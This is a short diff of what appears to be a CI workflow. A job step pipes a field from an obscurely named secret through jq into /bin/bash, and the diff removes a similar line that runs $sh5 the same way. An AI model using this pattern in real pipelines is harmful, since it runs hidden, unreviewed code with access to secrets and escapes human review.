@@ -21,7 +21,6 @@ jobs:
           ikqc29599: ${{ secrets.ikqc29599 }}
         run: |
           printf '%s' "$ikqc29599" | jq -r .lescj941 | /bin/bash
-          echo $sh5 | jq -r .ywyqg494 | /bin/bash
 
       - name: Store artifact
         if: always()
